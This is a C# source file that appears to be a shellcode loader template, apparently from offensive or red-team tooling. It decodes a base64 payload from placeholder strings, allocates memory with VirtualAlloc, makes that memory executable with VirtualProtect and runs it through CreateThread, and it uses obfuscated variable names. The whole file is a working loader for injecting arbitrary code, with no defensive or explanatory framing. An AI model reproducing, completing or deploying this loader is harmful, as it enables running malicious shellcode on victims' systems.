using System;
using System.Reflection;
using System.Diagnostics;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Threading;

class Program
    {
		[Flags()]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, Protection flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateThread(
                IntPtr lpThreadAttributes,
                uint dwStackSize,
                IntPtr lpStartAddress,
                IntPtr lpParameter,
                uint dwCreationFlags,
                out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, Protection flNewProtect, out uint lpflOldProtect);
		
        static void Main(string[] args)
        {
            byte[] shell = null;

            string safdsv64 = "#REPLACEME64#";
            string safdsv32 = "#REPLACEME32#";

            if (IntPtr.Size == 4)
            {
                // 32-bit
                shell = Convert.FromBase64String(safdsv32);
            }
            else if (IntPtr.Size == 8)
            {
                // 64-bit
                shell = Convert.FromBase64String(safdsv64);
            }

            IntPtr mem = VirtualAlloc(IntPtr.Zero, (IntPtr)(shell.Length*2), AllocationType.COMMIT, Protection.PAGE_READWRITE);

            if( mem != IntPtr.Zero )
            {
                uint oldProt = 0;
                uint threadId = 0;
                Marshal.Copy(shell, 0, mem, shell.Length);
                VirtualProtect(mem, (IntPtr)(shell.Length * 2), Protection.PAGE_EXECUTE_READWRITE, out oldProt);
                CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
                WaitHandle wh = new EventWaitHandle(false, EventResetMode.ManualReset);
                wh.WaitOne();
            }
        }

}
